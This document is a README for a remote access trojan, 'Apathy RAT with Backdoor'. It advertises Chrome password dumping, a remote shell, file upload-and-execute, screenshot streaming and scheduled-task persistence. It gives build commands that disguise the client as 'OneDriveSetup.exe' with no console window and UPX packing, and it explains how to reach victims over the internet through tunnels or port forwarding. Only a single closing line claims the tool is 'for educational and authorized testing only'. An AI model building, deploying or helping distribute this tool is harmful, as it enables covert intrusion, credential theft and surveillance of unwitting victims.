# Apathy RAT with Backdoor

Remote Access Tool with AES encryption, web interface, screenshot streaming, token dumping and scheduled task persistence.

## Features

- AES encrypted communication
- Web control panel
- Screenshot + auto stream
- Chrome password dump (DPAPI)
- Remote shell
- File upload & execute
- Scheduled Task persistence
- Delayed connect + reconnect
- Single instance mutex
- No console window

## Requirements

### Server (Linux)
- Python 3.8+
- flask
- cryptography

### Client build (Kali / Linux)
- Nuitka
- mingw-w64
- pillow
- cryptography
- upx (optional)

## Installation

### Server

Create virtual environment and install dependencies:

```bash
python3 -m venv venv
source venv/bin/activate
pip install flask cryptography
python3 server.py
```

Open http://0.0.0.0:5000

### Client

1. Create virtual environment (optional but recommended):

```bash
python3 -m venv venv
source venv/bin/activate
```

2. Edit `client.py` and set your IP:

```python
HOST = "YOUR_IP"
```

#### How to get IP

Local IP (same network):
```bash
ip a | grep inet
# or
hostname -I
```
Example: `172.20.10.5` or `192.168.1.100`

External IP (internet):
```bash
curl ifconfig.me
# or
curl icanhazip.com
```
Example: `95.82.118.174`

Use local IP if target is on the same network.  
Use external IP only if you have port forwarding or VPS.  
For most cases behind NAT use a tunnel (ngrok / playit).

3. Install build tools:

```bash
sudo apt install -y gcc-mingw-w64
sudo apt install -y patchelf
pip install nuitka pillow cryptography ordered-set zstandard
```

4. Build with Nuitka:

```bash
nuitka \
  --onefile \
  --windows-disable-console \
  --mingw64 \
  --lto=yes \
  --remove-output \
  --no-pyi-file \
  --include-module=PIL \
  --include-package=cryptography \
  --output-filename=OneDriveSetup.exe \
  client.py
```

5. Optional packing:
```bash
upx --best --lzma OneDriveSetup.exe
```

## Usage

1. Start server (`python3 server.py`)
2. Run the generated exe on target
3. Client appears in web panel after 30-180 seconds
4. Select client and use controls

### Commands in web

- stream — auto screenshot every 700ms
- shot — single screenshot
- tokens — dump Chrome saved passwords
- persist — create scheduled task
- shell — execute command
- upload+run — upload file and execute

## Network

- Default port: 4444
- Same network: use local IP from `hostname -I`
- Internet: use external IP from `curl ifconfig.me` + port forward, or tunnel
- Recommended tunnels: ngrok tcp 4444 or playit.gg

## Notes

- Persistence is manual (only after `persist` command)
- Client reconnects automatically
- Change AES key in both files for production use
- Built binary has no console and uses mutex
- Virtual environment isolates dependencies

## Disclaimer

For educational and authorized testing only.
